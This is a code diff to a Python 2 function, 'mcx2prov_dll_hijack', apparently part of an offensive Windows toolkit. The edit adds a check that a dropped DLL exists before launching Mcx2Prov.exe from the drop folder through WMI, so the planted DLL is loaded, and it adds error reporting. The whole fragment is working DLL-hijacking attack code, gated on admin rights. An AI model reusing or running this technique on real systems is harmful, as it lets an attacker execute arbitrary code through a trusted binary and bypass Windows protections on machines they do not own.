@@ -49,19 +49,19 @@ def mcx2prov_dll_hijack():
 			print " {} mcx2prov_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
 			return False
 
-		print " {} mcx2prov_dll_hijack: Attempting to create process".format(infoBox())
-		try:
-			result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"Mcx2Prov.exe")),
-							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
-			if (result[1] == 0):
-				print " {} mcx2prov_dll_hijack: Process started successfully".format(successBox())
-			else:
-				print " {} mcx2prov_dll_hijack: Problem creating process".format(errorBox())
+		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
+			print " {} mcx2prov_dll_hijack: Attempting to create process".format(infoBox())
+			try:
+				result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(dll_drop,"Mcx2Prov.exe")),
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+				if (result[1] == 0):
+					print " {} mcx2prov_dll_hijack: Process started successfully".format(successBox())
+				else:
+					print " {} mcx2prov_dll_hijack: Problem creating process".format(errorBox())
+			except Exception as error:
+				print " {} mcx2prov_dll_hijack: Problem creating process: {}".format(errorBox(),error)
 				return False
-		except Exception as error:
-			print " {} mcx2prov_dll_hijack: Problem creating process".format(errorBox())
-			return False			
 			
 	else:
 		print " {} mcx2prov_dll_hijack: We are not admin, cannot proceed".format(errorBox())
-		return False
+		return False	
